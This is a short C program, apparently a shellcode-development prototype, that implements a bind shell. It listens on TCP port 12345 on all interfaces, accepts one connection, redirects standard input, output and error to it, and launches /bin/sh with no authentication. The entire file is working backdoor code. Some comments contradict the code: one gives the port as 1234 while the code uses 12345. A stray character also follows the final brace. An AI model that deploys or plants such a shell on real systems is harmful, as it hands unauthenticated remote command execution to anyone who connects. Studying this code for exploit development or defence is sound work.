#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{

	int resultfd, sockfd;
	int port = 12345;
	struct sockaddr_in bind_address;

	// socketcall = 102
	// IPv4 and TCP (0)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	bind_address.sin_family = AF_INET; // = 2
	bind_address.sin_port = htons(port); // port = 1234
	bind_address.sin_addr.s_addr = INADDR_ANY; // NULLL (no IP)

	// syscall bind = 361
	bind(sockfd, (struct sockaddr *) &bind_address, sizeof(bind_address));

	// syscall listen = 363
	listen(sockfd, 0);

	// syscall socketcall (sys_accept 5)
	resultfd = accept(sockfd, NULL, NULL);

	// syscall dup2 = 63
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);

	// syscall execve = 11
	execve("/bin/sh", NULL, NULL);

	return 0;
}l
